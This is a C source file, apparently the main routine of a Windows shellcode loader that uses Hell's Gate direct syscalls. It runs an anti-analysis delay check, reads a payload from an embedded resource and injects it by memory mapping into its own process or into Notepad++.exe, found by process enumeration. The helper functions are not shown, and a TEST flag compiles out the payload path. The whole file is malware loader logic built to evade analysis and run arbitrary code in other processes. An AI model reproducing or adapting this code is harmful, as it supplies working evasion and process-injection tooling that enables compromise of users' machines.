#include "HellsGate.h"
#include "Common.h"

#define TEST

#define LOCAL_INJECTION

#ifndef LOCAL_INJECTION
#define TARGET_PROCESS L"Notepad++.exe"
#endif

#define ANTI_ANALYSIS

int main() {
	// Init syscalls for use
	if (InitializeSyscalls() == FALSE) {
		printf("[!] Failed To Initialize Syscalls\n");
		return -1;
	}

	// Init WinApis for use
	if (InitializeWinApis() == FALSE) {
		printf("[!] Failed To Initialize Windows APIs\n");
		return -1;
	}

#ifdef TEST
#else
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = 0;
	DWORD dwPid = 0;
	HANDLE hProcess = NULL;

#ifdef ANTI_ANALYSIS
	// Anti-analysis techniques
	DWORD	seconds = 5;
	DWORD	dwMilliseconds = seconds * 1000;
	if (AntiAnalysis(dwMilliseconds) == FALSE) {
		printf("File Is Being Analyzed!\n");
	}
#endif

	// Resource reading
	if (ReadPayloadFromResource(&pPayloadAddress, &sPayloadSize) != TRUE) {
		printf("[!] Failed To Read Payload From The Resource\n");
		return -1;
	}
	printf("[+] Read Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
#ifdef LOCAL_INJECTION
	RemoteMappingInjectionViaSyscalls(
		GetCurrentProcessHandle(),
		pPayloadAddress,
		sPayloadSize,
		TRUE
	);
#else
	// Process enumeration
	printf("[i] Enumerating Processes...\n");
	if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
		wprintf(L"[!] Failed To Find Target Process %ls\n", TARGET_PROCESS);
		return -1;
	}
	printf("[+] DONE!\n");
	wprintf(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);

	RemoteMappingInjectionViaSyscalls(
		hProcess,
		pPayloadAddress,
		sPayloadSize,
		FALSE
	);
#endif

#endif

	return 0;
}